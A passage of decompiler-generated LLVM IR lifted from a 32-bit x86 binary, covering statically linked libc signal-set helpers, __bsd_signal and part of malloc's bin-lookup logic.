  %v3_8052ca3 = sub i32 63, %arg1
  %v4_8052ca3 = and i32 %v3_8052ca3, %arg1
  %v5_8052ca3 = icmp slt i32 %v4_8052ca3, 0
  %v6_8052ca3 = icmp eq i32 %v1_8052ca3, 0
  %v7_8052ca3 = icmp slt i32 %v1_8052ca3, 0
  %v3_8052ca6 = icmp eq i1 %v7_8052ca3, %v5_8052ca3
  %v4_8052ca6 = icmp eq i1 %v6_8052ca3, false
  %v5_8052ca6 = and i1 %v4_8052ca6, %v3_8052ca6
  br i1 %v5_8052ca6, label %dec_label_pc_8052cb0, label %dec_label_pc_8052ca8

dec_label_pc_8052ca8:                             ; preds = %dec_label_pc_8052ca3
  %v4_8052cab = call i32 @__sigaddset(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8052cb0

dec_label_pc_8052cb0:                             ; preds = %dec_label_pc_8052ca3, %entry, %dec_label_pc_8052ca8
  %v1_8052cb0 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_8052cb5 = inttoptr i32 %v1_8052cb0 to i32*
  store i32 22, i32* %v1_8052cb5, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_8052ca3, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8052cb0, { 2, 0, 1 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  %v3_8052cd2 = inttoptr i32 %arg1 to i8*
  %v4_8052cd2 = call i32 @__GI_memset(i8* %v3_8052cd2, i32 0, i32 128)
  ret i32 0
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_8052ce0 = load i32, i32* @ebx, align 4
  %v15_8052ce1 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_8052cf5 = icmp eq i32 %arg2, -1
  br i1 %v10_8052cf5, label %dec_label_pc_8052d03, label %dec_label_pc_8052cfa

dec_label_pc_8052cfa:                             ; preds = %entry
  %tmp16 = icmp slt i32 %arg1, 1
  br i1 %tmp16, label %dec_label_pc_8052d03, label %dec_label_pc_8052cfe

dec_label_pc_8052cfe:                             ; preds = %dec_label_pc_8052cfa
  %v7_8052d01 = icmp sgt i32 %arg1, 64
  br i1 %v7_8052d01, label %dec_label_pc_8052d03, label %dec_label_pc_8052d10

dec_label_pc_8052d03:                             ; preds = %dec_label_pc_8052cfe, %dec_label_pc_8052cfa, %entry
  %v1_8052d03 = call i32 @__errno_location(i32 %v0_8052ce0)
  store i32 %v1_8052d03, i32* %eax.global-to-local, align 4
  %v1_8052d08 = inttoptr i32 %v1_8052d03 to i32*
  store i32 22, i32* %v1_8052d08, align 4
  br label %dec_label_pc_8052d84

dec_label_pc_8052d10:                             ; preds = %dec_label_pc_8052cfe
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d1e

dec_label_pc_8052d1e:                             ; preds = %dec_label_pc_8052d1e.dec_label_pc_8052d1e_crit_edge, %dec_label_pc_8052d10
  %v0_8052d1e = phi i32 [ %v15_8052ce1, %dec_label_pc_8052d10 ], [ %v0_8052d1e.pre, %dec_label_pc_8052d1e.dec_label_pc_8052d1e_crit_edge ]
  %v1_8052d2917 = phi i32 [ 31, %dec_label_pc_8052d10 ], [ %v1_8052d29, %dec_label_pc_8052d1e.dec_label_pc_8052d1e_crit_edge ]
  %v2_8052d1e = mul i32 %v1_8052d2917, 4
  %v3_8052d1e = add i32 %v2_8052d1e, 160
  %v4_8052d1e = add i32 %v3_8052d1e, %v0_8052d1e
  %v5_8052d1e = inttoptr i32 %v4_8052d1e to i32*
  store i32 0, i32* %v5_8052d1e, align 4
  %v0_8052d29.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8052d29 = add i32 %v0_8052d29.pre, -1
  %v9_8052d29 = icmp slt i32 %v1_8052d29, 0
  store i32 %v1_8052d29, i32* %eax.global-to-local, align 4
  %v1_8052d2a = icmp eq i1 %v9_8052d29, false
  br i1 %v1_8052d2a, label %dec_label_pc_8052d1e.dec_label_pc_8052d1e_crit_edge, label %dec_label_pc_8052d2c

dec_label_pc_8052d1e.dec_label_pc_8052d1e_crit_edge: ; preds = %dec_label_pc_8052d1e
  %v0_8052d1e.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052d1e

dec_label_pc_8052d2c:                             ; preds = %dec_label_pc_8052d1e
  %v0_8052d2c = load i32, i32* @edx, align 4
  %v2_8052d2f = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_8052d2f, i32* %eax.global-to-local, align 4
  %v4_8052d37 = call i32 @__sigaddset(i32 %v2_8052d2f, i32 %arg1, i32 %v0_8052d2c, i32 %v0_8052d2c)
  store i32 %v4_8052d37, i32* %eax.global-to-local, align 4
  %v2_8052d3f = icmp slt i32 %v4_8052d37, 0
  br i1 %v2_8052d3f, label %dec_label_pc_8052d84, label %dec_label_pc_8052d43

dec_label_pc_8052d43:                             ; preds = %dec_label_pc_8052d2c
  %v4_8052d4b = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_80617c0.500 to i32), i32 %arg1, i32 %v4_8052d37, i32 %v4_8052d37)
  %v2_8052d64 = ptrtoint i32* %stack_var_-284 to i32
  %v2_8052d69 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8052d69, i32* %eax.global-to-local, align 4
  %v4_8052d72 = call i32 @__libc_sigaction(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_8052d64)
  store i32 %v4_8052d72, i32* %eax.global-to-local, align 4
  %v2_8052d7a = icmp slt i32 %v4_8052d72, 0
  br i1 %v2_8052d7a, label %dec_label_pc_8052d84, label %dec_label_pc_8052d7e

dec_label_pc_8052d7e:                             ; preds = %dec_label_pc_8052d43
  %v3_8052d7e = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_8052d87

dec_label_pc_8052d84:                             ; preds = %dec_label_pc_8052d43, %dec_label_pc_8052d2c, %dec_label_pc_8052d03
  br label %dec_label_pc_8052d87

dec_label_pc_8052d87:                             ; preds = %dec_label_pc_8052d7e, %dec_label_pc_8052d84
  %storemerge = phi i32 [ -1, %dec_label_pc_8052d84 ], [ %v3_8052d7e, %dec_label_pc_8052d7e ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8052ce0, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8052d29, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 8, 9, 5, 6 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 4, 3, 1, 2, 0, 5 }
  uselistorder label %dec_label_pc_8052d87, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_8052d9e = add i32 %arg2, -1
  %v1_8052da1 = urem i32 %v1_8052d9e, 32
  %v2_8052da1 = icmp eq i32 %v1_8052da1, 0
  %v2_8052da4 = udiv i32 %v1_8052d9e, 32
  br i1 %v2_8052da1, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_8052da7 = shl i32 1, %v1_8052da1
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_8052da9 = phi i32 [ 1, %entry ], [ %v5_8052da7, %bb ]
  %v2_8052da9 = mul nuw nsw i32 %v2_8052da4, 4
  %v3_8052da9 = add i32 %v2_8052da9, %arg1
  %v4_8052da9 = inttoptr i32 %v3_8052da9 to i32*
  %v5_8052da9 = load i32, i32* %v4_8052da9, align 4
  %v7_8052da9 = and i32 %v5_8052da9, %v6_8052da9
  %v8_8052da9 = icmp eq i32 %v7_8052da9, 0
  %v1_8052dad = icmp eq i1 %v8_8052da9, false
  %v2_8052dad = zext i1 %v1_8052dad to i32
  ret i32 %v2_8052dad

; uselistorder directives
  uselistorder i32 %v1_8052da1, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8052db4 = load i32, i32* @ebx, align 4
  store i32 %v0_8052db4, i32* %stack_var_-4, align 4
  %v1_8052dc2 = add i32 %arg2, -1
  %v1_8052dc5 = urem i32 %v1_8052dc2, 32
  %v2_8052dc5 = icmp eq i32 %v1_8052dc5, 0
  store i32 %v1_8052dc5, i32* @ecx, align 4
  %v2_8052dc8 = udiv i32 %v1_8052dc2, 32
  store i32 %v2_8052dc8, i32* @edx, align 4
  br i1 %v2_8052dc5, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_8052dcb = shl i32 1, %v1_8052dc5
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_8052dcd = phi i32 [ 1, %entry ], [ %v5_8052dcb, %bb ]
  %v2_8052dcd = mul nuw nsw i32 %v2_8052dc8, 4
  %v3_8052dcd = add i32 %v2_8052dcd, %arg1
  %v4_8052dcd = inttoptr i32 %v3_8052dcd to i32*
  %v5_8052dcd = load i32, i32* %v4_8052dcd, align 4
  %v7_8052dcd = or i32 %v5_8052dcd, %v6_8052dcd
  store i32 %v7_8052dcd, i32* %v4_8052dcd, align 4
  %v2_8052dd2 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8052dd2, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_8052dc8, { 1, 0 }
  uselistorder i32 %v1_8052dc5, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8052de2 = add i32 %arg2, -1
  %v1_8052de5 = urem i32 %v1_8052de2, 32
  %v2_8052de5 = icmp eq i32 %v1_8052de5, 0
  %v2_8052de8 = udiv i32 %v1_8052de2, 32
  br i1 %v2_8052de5, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v4_8052deb = shl i32 -2, %v1_8052de5
  %v5_8052deb = sub nsw i32 32, %v1_8052de5
  %v6_8052deb = lshr i32 -2, %v5_8052deb
  %v7_8052deb = or i32 %v6_8052deb, %v4_8052deb
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_8052ded = phi i32 [ -2, %entry ], [ %v7_8052deb, %bb ]
  %v2_8052ded = mul nuw nsw i32 %v2_8052de8, 4
  %v3_8052ded = add i32 %v2_8052ded, %arg1
  %v4_8052ded = inttoptr i32 %v3_8052ded to i32*
  %v5_8052ded = load i32, i32* %v4_8052ded, align 4
  %v7_8052ded = and i32 %v5_8052ded, %v6_8052ded
  store i32 %v7_8052ded, i32* %v4_8052ded, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_8052de5, { 1, 2, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__malloc_largebin_index() local_unnamed_addr {
entry:
  %v0_8052df4 = load i32, i32* @eax, align 4
  %v6_8052e07 = icmp ugt i32 %v0_8052df4, 16777215
  br i1 %v6_8052e07, label %dec_label_pc_8052e18, label %dec_label_pc_8052e09

dec_label_pc_8052e09:                             ; preds = %entry
  %tmp = icmp ult i32 %v0_8052df4, 256
  %v2_8052df7 = udiv i32 %v0_8052df4, 256
  %v2_8052e09 = call i32 @llvm.ctlz.i32(i32 %v2_8052df7, i1 true)
  %v3_8052e09 = xor i32 %v2_8052e09, 31
  %v5_8052e09 = select i1 %tmp, i32 95, i32 %v3_8052e09
  %v1_8052e0c = add nuw nsw i32 %v5_8052e09, 6
  store i32 %v1_8052e0c, i32* @ecx, align 4
  %v2_8052e0f = urem i32 %v1_8052e0c, 32
  %v4_8052e0f = icmp eq i32 %v2_8052e0f, 0
  br i1 %v4_8052e0f, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_8052e09
  %v5_8052e0f = lshr i32 %v0_8052df4, %v2_8052e0f
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_8052e09, %bb
  %v0_8052e11 = phi i32 [ %v0_8052df4, %dec_label_pc_8052e09 ], [ %v5_8052e0f, %bb ]
  %v1_8052e11 = urem i32 %v0_8052e11, 4
  %v2_8052e14 = mul nuw nsw i32 %v5_8052e09, 4
  %v3_8052e14 = or i32 %v1_8052e11, 32
  %v4_8052e14 = add nuw nsw i32 %v3_8052e14, %v2_8052e14
  br label %dec_label_pc_8052e18

dec_label_pc_8052e18:                             ; preds = %entry, %bb4
  %v0_8052e19 = phi i32 [ 95, %entry ], [ %v4_8052e14, %bb4 ]
  ret i32 %v0_8052e19

; uselistorder directives
  uselistorder i32 %v2_8052e0f, { 1, 0 }
  uselistorder i32 %v0_8052df4, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_8052e18, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8052e1a = load i32, i32* @ebp, align 4
  %v0_8052e1b = load i32, i32* @edi, align 4
  %v0_8052e1c = load i32, i32* @esi, align 4
  %v0_8052e1d = load i32, i32* @ebx, align 4
  store i32 %v0_8052e1d, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8052e2f = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8052e2f, i32* @eax, align 4
  store i32 %v2_8052e2f, i32* %stack_var_-92, align 4
  %v2_8052e34 = call i32 @__pthread_return_void(i32 %v2_8052e2f, i32 134563799)
  store i32 %v2_8052e34, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805b3d0.501 to i32), i32* %stack_var_-92, align 4
  %v1_8052e40 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b3d0.501 to i32))
  store i32 %v1_8052e40, i32* %eax.global-to-local, align 4
  %v0_8052e48 = load i32, i32* %ebx.global-to-local, align 4
  %tmp125 = icmp ult i32 %v0_8052e48, -32
  br i1 %tmp125, label %dec_label_pc_8052e5f, label %dec_label_pc_8052e4d

dec_label_pc_8052e4d:                             ; preds = %entry
  %v0_8052e4d = load i32, i32* %stack_var_-92, align 4
  %v1_8052e4d = call i32 @__errno_location(i32 %v0_8052e4d)
  store i32 %v1_8052e4d, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8052e54 = inttoptr i32 %v1_8052e4d to i32*
  store i32 12, i32* %v1_8052e54, align 4
  br label %dec_label_pc_8053584

dec_label_pc_8052e5f:                             ; preds = %entry
  %v1_8052e5f = add i32 %v0_8052e48, 11
  %tmp126 = icmp ult i32 %v1_8052e5f, 16
  br i1 %tmp126, label %dec_label_pc_8052e76, label %dec_label_pc_8052e6f

dec_label_pc_8052e6f:                             ; preds = %dec_label_pc_8052e5f
  %v1_8052e6f = and i32 %v1_8052e5f, -8
  br label %dec_label_pc_8052e76

dec_label_pc_8052e76:                             ; preds = %dec_label_pc_8052e5f, %dec_label_pc_8052e6f
  %storemerge136 = phi i32 [ %v1_8052e6f, %dec_label_pc_8052e6f ], [ %v1_8052e5f, %dec_label_pc_8052e5f ]
  %v1_805320e = phi i32 [ %v1_8052e6f, %dec_label_pc_8052e6f ], [ 16, %dec_label_pc_8052e5f ]
  store i32 %storemerge136, i32* %eax.global-to-local, align 4
  %v0_8052e76 = load i8, i8* @global_var_8061840.502, align 1
  %v1_8052e76 = sext i8 %v0_8052e76 to i32
  store i32 %v1_8052e76, i32* @ebx, align 4
  %v3_8052e7c = urem i8 %v0_8052e76, 2
  %v4_8052e7c = icmp eq i8 %v3_8052e7c, 0
  %v1_8052e7f = icmp eq i1 %v4_8052e7c, false
  br i1 %v1_8052e7f, label %dec_label_pc_8052e9e, label %dec_label_pc_8052e81

dec_label_pc_8052e81:                             ; preds = %dec_label_pc_8052e76
  %v2_8052e81 = icmp eq i8 %v0_8052e76, 0
  %v1_8052e83 = icmp eq i1 %v2_8052e81, false
  br i1 %v1_8052e83, label %dec_label_pc_8053179, label %dec_label_pc_8052e89

dec_label_pc_8052e89:                             ; preds = %dec_label_pc_8052e81
  store i32 ptrtoint (i8* @global_var_8061840.502 to i32), i32* %stack_var_-92, align 4
  %v2_8052e91 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8061840.502 to i32*))
  store i32 %v2_8052e91, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053179

dec_label_pc_8052e9e:                             ; preds = %dec_label_pc_8052e76
  %v11_8052e9e = trunc i32 %v1_805320e to i8
  %v8_8052ea2 = icmp ugt i8 %v11_8052e9e, %v0_8052e76
  br i1 %v8_8052ea2, label %dec_label_pc_8052ebf, label %dec_label_pc_8052ea4

dec_label_pc_8052ea4:                             ; preds = %dec_label_pc_8052e9e
  %v2_8052ea8 = udiv i32 %v1_805320e, 2
  store i32 %v2_8052ea8, i32* %eax.global-to-local, align 4
  %v1_8052eaa = add i32 %v2_8052ea8, ptrtoint (i8* @global_var_8061840.502 to i32)
  store i32 %v1_8052eaa, i32* @ecx, align 4
  %v1_8052eb0 = add i32 %v2_8052ea8, add (i32 ptrtoint (i8* @global_var_8061840.502 to i32), i32 -4)
  %v2_8052eb0 = inttoptr i32 %v1_8052eb0 to i32*
  %v3_8052eb0 = load i32, i32* %v2_8052eb0, align 4
  store i32 %v3_8052eb0, i32* @edx, align 4
  %v1_8052eb3 = icmp eq i32 %v3_8052eb0, 0
  br i1 %v1_8052eb3, label %dec_label_pc_8052ebf, label %dec_label_pc_8052eb7

dec_label_pc_8052eb7:                             ; preds = %dec_label_pc_8052ea4
  %v1_8052eb7 = add i32 %v3_8052eb0, 8
  %v2_8052eb7 = inttoptr i32 %v1_8052eb7 to i32*
  %v3_8052eb7 = load i32, i32* %v2_8052eb7, align 4
  store i32 %v3_8052eb7, i32* %eax.global-to-local, align 4
  store i32 %v3_8052eb7, i32* %v2_8052eb0, align 4
  br label %dec_label_pc_8052ef8

dec_label_pc_8052ebf:                             ; preds = %dec_label_pc_8052ea4, %dec_label_pc_8052e9e
  %v8_8052ebf = icmp ult i32 %v1_805320e, 255
  %v6_8052ec7 = icmp ugt i32 %v1_805320e, 255
  store i32 %v1_805320e, i32* @eax, align 4
  br i1 %v6_8052ec7, label %dec_label_pc_8052f00, label %dec_label_pc_8052ec9

dec_label_pc_8052ec9:                             ; preds = %dec_label_pc_8052ebf
  %v2_8052ecd = udiv i32 %v1_805320e, 8
  store i32 %v2_8052ecd, i32* %eax.global-to-local, align 4
  %v1_8052ed4 = mul nuw i32 %v2_8052ecd, 8
  %v2_8052ed4 = add i32 %v1_8052ed4, ptrtoint (i32* @global_var_806186c.503 to i32)
  store i32 %v2_8052ed4, i32* @ecx, align 4
  %v1_8052edb = add i32 %v1_8052ed4, add (i32 ptrtoint (i32* @global_var_806186c.503 to i32), i32 12)
  %v2_8052edb = inttoptr i32 %v1_8052edb to i32*
  %v3_8052edb = load i32, i32* %v2_8052edb, align 4
  store i32 %v3_8052edb, i32* @edx, align 4
  %v12_8052ede = icmp eq i32 %v3_8052edb, %v2_8052ed4
  br i1 %v12_8052ede, label %dec_label_pc_8052ffc.preheader, label %dec_label_pc_8052ee6

dec_label_pc_8052ee6:                             ; preds = %dec_label_pc_8052ec9
  store i32 %v1_805320e, i32* %ebx.global-to-local, align 4
  %v1_8052eea = add i32 %v3_8052edb, 12
  %v2_8052eea = inttoptr i32 %v1_8052eea to i32*
  %v3_8052eea = load i32, i32* %v2_8052eea, align 4
  store i32 %v3_8052eea, i32* %eax.global-to-local, align 4
  store i32 %v3_8052eea, i32* %v2_8052edb, align 4
  %v0_8052ef0 = load i32, i32* @edx, align 4
  %v1_8052ef0 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052ef0 = add i32 %v0_8052ef0, 4
  %v3_8052ef0 = add i32 %v2_8052ef0, %v1_8052ef0
  %v4_8052ef0 = inttoptr i32 %v3_8052ef0 to i32*
  %v5_8052ef0 = load i32, i32* %v4_8052ef0, align 4
  %v6_8052ef0 = or i32 %v5_8052ef0, 1
  store i32 %v6_8052ef0, i32* %v4_8052ef0, align 4
  %v0_8052ef5 = load i32, i32* @ecx, align 4
  %v1_8052ef5 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052ef5 = add i32 %v1_8052ef5, 8
  %v3_8052ef5 = inttoptr i32 %v2_8052ef5 to i32*
  store i32 %v0_8052ef5, i32* %v3_8052ef5, align 4
  br label %dec_label_pc_8052ef8

dec_label_pc_8052ef8:                             ; preds = %dec_label_pc_8053295, %dec_label_pc_80532a7, %dec_label_pc_8052eb7, %dec_label_pc_8052ee6
  %v0_8052ef8 = load i32, i32* @edx, align 4
  %v1_8052ef8 = add i32 %v0_8052ef8, 8
  store i32 %v1_8052ef8, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053573

dec_label_pc_8052f00:                             ; preds = %dec_label_pc_8052ebf
  %v0_8052f04 = call i32 @__malloc_largebin_index()
  store i32 %v0_8052f04, i32* %eax.global-to-local, align 4
  %v3_8052f09 = and i8 %v0_8052e76, 2
  %v4_8052f09 = icmp eq i8 %v3_8052f09, 0
  %v6_8052f09 = zext i8 %v3_8052f09 to i32
  %v9_8052f09 = and i32 %v1_8052e76, -256
  %v10_8052f09 = or i32 %v9_8052f09, %v6_8052f09
  store i32 %v10_8052f09, i32* @ebx, align 4
  br i1 %v4_8052f09, label %dec_label_pc_8052ffc.preheader, label %dec_label_pc_8052f16

dec_label_pc_8052f16:                             ; preds = %dec_label_pc_8052f00
  store i32 ptrtoint (i8* @global_var_8061840.502 to i32), i32* %stack_var_-92, align 4
  %v2_8052f1e = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8061840.502 to i32*))
  store i32 %v2_8052f1e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052ffc.preheader

dec_label_pc_8052ffc.preheader:                   ; preds = %dec_label_pc_8052f16, %dec_label_pc_8052ec9, %dec_label_pc_8052f00
  %stack_var_-40.0.ph = phi i32 [ %v2_8052ecd, %dec_label_pc_8052ec9 ], [ %v0_8052f04, %dec_label_pc_8052f16 ], [ %v0_8052f04, %dec_label_pc_8052f00 ]
  %v1_8052f52 = add i32 %v1_805320e, 16
  %v0_8052ffc107 = load i32, i32* @global_var_8061880.506, align 128
  store i32 %v0_8052ffc107, i32* @ebp, align 4
  %v9_8053002109 = icmp eq i32 %v0_8052ffc107, 134617204
  %v1_8053008110 = icmp eq i1 %v9_8053002109, false
  br i1 %v1_8053008110, label %dec_label_pc_8052f2b, label %dec_label_pc_805300e

dec_label_pc_8052f2b:                             ; preds = %dec_label_pc_8052ffc.preheader, %bb84
  %v0_8052ffc111 = phi i32 [ %v0_8052ffc, %bb84 ], [ %v0_8052ffc107, %dec_label_pc_8052ffc.preheader ]
  %v1_8052f2b = add i32 %v0_8052ffc111, 4
  %v2_8052f2b = inttoptr i32 %v1_8052f2b to i32*
  %v3_8052f2b = load i32, i32* %v2_8052f2b, align 4
  %v1_8052f2e = add i32 %v0_8052ffc111, 12
  %v2_8052f2e = inttoptr i32 %v1_8052f2e to i32*
  %v3_8052f2e = load i32, i32* %v2_8052f2e, align 4
  store i32 %v3_8052f2e, i32* @edx, align 4
  %v1_8052f31 = and i32 %v3_8052f2b, -4
  store i32 %v1_8052f31, i32* @edi, align 4
  br i1 %v6_8052ec7, label %dec_label_pc_8052f5d, label %dec_label_pc_8052f3e

dec_label_pc_8052f3e:                             ; preds = %dec_label_pc_8052f2b
  %v9_8052f3e = icmp eq i32 %v3_8052f2e, 134617204
  %v1_8052f44 = icmp eq i1 %v9_8052f3e, false
  br i1 %v1_8052f44, label %dec_label_pc_8052f5d, label %dec_label_pc_8052f46

dec_label_pc_8052f46:                             ; preds = %dec_label_pc_8052f3e
  %v1_8052f46 = load i32, i32* @global_var_8061870.504, align 16
  %v12_8052f46 = icmp eq i32 %v0_8052ffc111, %v1_8052f46
  %v1_8052f4c = icmp eq i1 %v12_8052f46, false
  br i1 %v1_8052f4c, label %dec_label_pc_8052f5d, label %dec_label_pc_8052f4e

dec_label_pc_8052f4e:                             ; preds = %dec_label_pc_8052f46
  store i32 %v1_8052f52, i32* %eax.global-to-local, align 4
  %v6_8052f57 = icmp ugt i32 %v1_8052f31, %v1_8052f52
  br i1 %v6_8052f57, label %dec_label_pc_805350e, label %dec_label_pc_8052f5d

dec_label_pc_8052f5d:                             ; preds = %dec_label_pc_8052f4e, %dec_label_pc_8052f46, %dec_label_pc_8052f3e, %dec_label_pc_8052f2b
  store i32 ptrtoint (i32* @global_var_8061874.505 to i32), i32* %eax.global-to-local, align 4
  %v2_8052f62 = add i32 %v3_8052f2e, 8
  %v3_8052f62 = inttoptr i32 %v2_8052f62 to i32*
  store i32 ptrtoint (i32* @global_var_8061874.505 to i32), i32* %v3_8052f62, align 4
  %v0_8052f65 = load i32, i32* @edx, align 4
  store i32 %v0_8052f65, i32* @global_var_8061880.506, align 4
  %v0_8052f68 = load i32, i32* @edi, align 4
  %v15_8052f68 = icmp eq i32 %v0_8052f68, %v1_805320e
  br i1 %v15_8052f68, label %dec_label_pc_805354f, label %dec_label_pc_8052f72

dec_label_pc_8052f72:                             ; preds = %dec_label_pc_8052f5d
  %v6_8052f78 = icmp ugt i32 %v0_8052f68, 255
  br i1 %v6_8052f78, label %dec_label_pc_8052f8b, label %dec_label_pc_8052f7a

dec_label_pc_8052f7a:                             ; preds = %dec_label_pc_8052f72
  %v2_8052f7c = udiv i32 %v0_8052f68, 8
  store i32 %v2_8052f7c, i32* %esi.global-to-local, align 4
  %v1_8052f7f = mul nuw i32 %v2_8052f7c, 8
  %v2_8052f7f = add i32 %v1_8052f7f, 134617196
  store i32 %v2_8052f7f, i32* @ebx, align 4
  %v1_8052f86 = add i32 %v1_8052f7f, 134617204
  %v2_8052f86 = inttoptr i32 %v1_8052f86 to i32*
  %v3_8052f86 = load i32, i32* %v2_8052f86, align 4
  store i32 %v3_8052f86, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052fd4

dec_label_pc_8052f8b:                             ; preds = %dec_label_pc_8052f72
  store i32 %v0_8052f68, i32* @eax, align 4
  %v0_8052f8d = call i32 @__malloc_largebin_index()
  store i32 %v0_8052f8d, i32* %esi.global-to-local, align 4
  %v1_8052f94 = mul i32 %v0_8052f8d, 8
  %v2_8052f94 = add i32 %v1_8052f94, ptrtoint (i32* @global_var_806186c.503 to i32)
  store i32 %v2_8052f94, i32* %eax.global-to-local, align 4
  %v1_8052f9b = add i32 %v1_8052f94, add (i32 ptrtoint (i32* @global_var_806186c.503 to i32), i32 8)
  %v2_8052f9b = inttoptr i32 %v1_8052f9b to i32*
  %v3_8052f9b = load i32, i32* %v2_8052f9b, align 4
  store i32 %v3_8052f9b, i32* %edx.global-to-local, align 4
  store i32 %v3_8052f9b, i32* @ebx, align 4
  %v12_8052fa4 = icmp eq i32 %v3_8052f9b, %v2_8052f94
  br i1 %v12_8052fa4, label %dec_label_pc_8052fd4, label %dec_label_pc_8052fa8

dec_label_pc_8052fa8:                             ; preds = %dec_label_pc_8052f8b
  %v1_8052fa8 = add i32 %v1_8052f94, add (i32 ptrtoint (i32* @global_var_806186c.503 to i32), i32 12)
  %v2_8052fa8 = inttoptr i32 %v1_8052fa8 to i32*
  %v3_8052fa8 = load i32, i32* %v2_8052fa8, align 4
  store i32 %v3_8052fa8, i32* @ebx, align 4
  %v0_8052fab = load i32, i32* @edi, align 4
  %v2_8052fab = add i32 %v3_8052fa8, 4
  %v3_8052fab = inttoptr i32 %v2_8052fab to i32*
  %v4_8052fab = load i32, i32* %v3_8052fab, align 4
  %v10_8052fab = icmp ult i32 %v0_8052fab, %v4_8052fab
  %v1_8052fae = icmp eq i1 %v10_8052fab, false
  br i1 %v1_8052fae, label %dec_label_pc_8052fb6, label %dec_label_pc_8052fd4

dec_label_pc_8052fb6:                             ; preds = %dec_label_pc_8052fa8
  %v1_8052fb8 = or i32 %v0_8052fab, 1
  store i32 %v1_8052fb8, i32* %eax.global-to-local, align 4
  store i32 %v3_8052f9b, i32* %ebx.global-to-local, align 4
  %v2_8052fcc101 = add i32 %v3_8052f9b, 4
  %v3_8052fcc102 = inttoptr i32 %v2_8052fcc101 to i32*
  %v4_8052fcc103 = load i32, i32* %v3_8052fcc102, align 4
  %v10_8052fcc104 = icmp ult i32 %v1_8052fb8, %v4_8052fcc103
  br i1 %v10_8052fcc104, label %dec_label_pc_8052fbd, label %dec_label_pc_8052fd1

dec_label_pc_8052fbd:                             ; preds = %dec_label_pc_8052fb6, %dec_label_pc_8052fbd
  %v0_8052fd1105 = phi i32 [ %v3_8052fc1, %dec_label_pc_8052fbd ], [ %v3_8052f9b, %dec_label_pc_8052fb6 ]
  store i32 %v0_8052fd1105, i32* %ecx.global-to-local, align 4
  %v1_8052fc1 = add i32 %v0_8052fd1105, 8
  %v2_8052fc1 = inttoptr i32 %v1_8052fc1 to i32*
